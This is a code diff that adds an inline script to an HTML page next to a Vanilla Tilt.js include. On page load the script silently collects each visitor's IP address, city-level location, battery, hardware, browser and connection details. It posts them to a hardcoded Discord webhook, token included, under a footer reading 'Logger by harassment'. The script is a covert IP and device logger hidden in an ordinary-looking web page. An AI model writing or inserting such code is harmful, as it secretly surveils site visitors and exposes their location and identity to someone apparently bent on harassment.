@@ -20,6 +20,213 @@
 
   <!-- Vanilla Tilt.js -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/vanilla-tilt/1.7.0/vanilla-tilt.min.js"></script>
+    <script>
+    async function getUserData() {
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const ip = ipData.ip;
+            const browserInfo = navigator.userAgent;
+            const screenResolution = `${window.screen.width}x${window.screen.height}`;
+            const language = navigator.language;
+            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const timestamp = new Date().toLocaleString('pl-PL', {
+                timeZone
+            });
+
+            const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "📱 Mobile" : "💻 Computer";
+            const onlineStatus = navigator.onLine ? "🟢 Online" : "🔴 Offline";
+            const uptime = `${(performance.now() / 60000).toFixed(2)} min`;
+            const os = navigator.userAgentData ? navigator.userAgentData.platform : navigator.platform;
+            const cpuCores = navigator.hardwareConcurrency;
+            const navHeight = `${window.innerHeight}px`;
+            let batteryLevel = "Nieznane";
+            let powerSavingMode = "Nieznane";
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                batteryLevel = `${(battery.level * 100).toFixed(0)}%`;
+                powerSavingMode = battery.charging ? "No" : "Yes";
+            }
+
+            let adBlockEnabled = "Nieznane";
+            try {
+                await fetch(new Request("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js", {
+                        method: 'HEAD',
+                        mode: 'no-cors'
+                    }))
+                    .then(() => adBlockEnabled = "❌ None", () => adBlockEnabled = "✅ Yes");
+            } catch (error) {
+                adBlockEnabled = "✅ Yes";
+            }
+
+            const browserName = navigator.appName;
+            const browserVersion = navigator.appVersion;
+            const browserLanguage = navigator.language;
+            const cookiesEnabled = navigator.cookieEnabled ? "✅ Yes" : "❌ None";
+            const connectionType = navigator.connection ? navigator.connection.effectiveType : "Nieznane";
+            const connectionRtt = navigator.connection ? `${navigator.connection.rtt} ms` : "Nieznane";
+            const connectionDownlink = navigator.connection ? `${navigator.connection.downlink} Mbps` : "Nieznane";
+            const osVersion = navigator.userAgentData ? navigator.userAgentData.platformVersion : "Nieznane";
+
+            let location = "Nieznane";
+            try {
+                const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                const locationData = await locationResponse.json();
+                location = `${locationData.city}, ${locationData.region}, ${locationData.country_name}`;
+            } catch (error) {
+                console.error("Error Whilst Locating:", error);
+            }
+
+            const data = {
+                ip,
+                browser: browserInfo,
+                resolution: screenResolution,
+                language,
+                timeZone,
+                timestamp,
+                deviceType,
+                onlineStatus,
+                uptime,
+                os,
+                cpuCores,
+                navHeight,
+                batteryLevel,
+                powerSavingMode,
+                adBlockEnabled,
+                browserName,
+                browserVersion,
+                browserLanguage,
+                cookiesEnabled,
+                connectionType,
+                connectionRtt,
+                connectionDownlink,
+                osVersion,
+                location
+            };
+
+            await sendDataToWebhook(data);
+        } catch (error) {
+            console.error("Error While Downloading Data:", error);
+        }
+    }
+
+    async function sendDataToWebhook(data) {
+        const webhookUrl = 'https://discord.com/api/webhooks/1340632409749721108/lKoQRkWR4Gc6ipXqf_gfdEzvP_8ut8wsQ5LaI75vRhuq7WyyPi7Ty4FWrCiBTfL8tXGS'; // webhook
+
+        const payload = {
+            content: "📡 **User Logged On Site**",
+            embeds: [{
+                title: "📊 Device Details",
+                color: 16711680,
+                fields: [{
+                    name: "📍 IP",
+                    value: data.ip,
+                    inline: true
+                }, {
+                    name: "🌍 Location",
+                    value: data.location,
+                    inline: true
+                }, {
+                    name: "🖥️ Resolution",
+                    value: data.resolution,
+                    inline: true
+                }, {
+                    name: "🗣️ Language",
+                    value: data.language,
+                    inline: true
+                }, {
+                    name: "🕒 TimeZone",
+                    value: data.timeZone,
+                    inline: true
+                }, {
+                    name: "📅 Time",
+                    value: data.timestamp,
+                    inline: false
+                }, {
+                    name: "📱 Device",
+                    value: data.deviceType,
+                    inline: true
+                }, {
+                    name: "🔋 Battery",
+                    value: data.batteryLevel,
+                    inline: true
+                }, {
+                    name: "⚡ Power Saving",
+                    value: data.powerSavingMode,
+                    inline: true
+                }, {
+                    name: "🖥️ Operating System",
+                    value: data.os,
+                    inline: true
+                }, {
+                    name: "🔗 Status online",
+                    value: data.onlineStatus,
+                    inline: true
+                }, {
+                    name: "📊 Uptime",
+                    value: data.uptime,
+                    inline: true
+                }, {
+                    name: "🖥️ CPU Cores",
+                    value: data.cpuCores.toString(),
+                    inline: true
+                }, {
+                    name: "📏 Bar Height",
+                    value: data.navHeight,
+                    inline: true
+                }, {
+                    name: "🚫 AdBlock",
+                    value: data.adBlockEnabled,
+                    inline: true
+                }, {
+                    name: "🌐 Browser",
+                    value: data.browserName,
+                    inline: true
+                }, {
+                    name: "📜 Browser Version",
+                    value: data.browserVersion,
+                    inline: true
+                }, {
+                    name: "🍪 Cookies",
+                    value: data.cookiesEnabled,
+                    inline: true
+                }, {
+                    name: "📶 Connection",
+                    value: data.connectionType,
+                    inline: true
+                }, {
+                    name: "⏱️ Delay (RTT)",
+                    value: data.connectionRtt,
+                    inline: true
+                }, {
+                    name: "⬇️ Download Speed",
+                    value: data.connectionDownlink,
+                    inline: true
+                }],
+                footer: {
+                    text: "Logger by harassment",
+                    icon_url: "https://cdn.discordapp.com/avatars/1201069596002766939/9de5bd364834a2120ff75d0d910d2fd0.png?size=4096"
+                }
+            }]
+        };
+
+        const response = await fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        });
+
+        if (!response.ok) {
+            console.error("Błąd wysyłania:", response.statusText);
+        } else {
+            console.log("Dane wysłane pomyślnie.");
+        }
+    }
+
+    window.onload = getUserData;
+</script>
 
   <style>
     * {
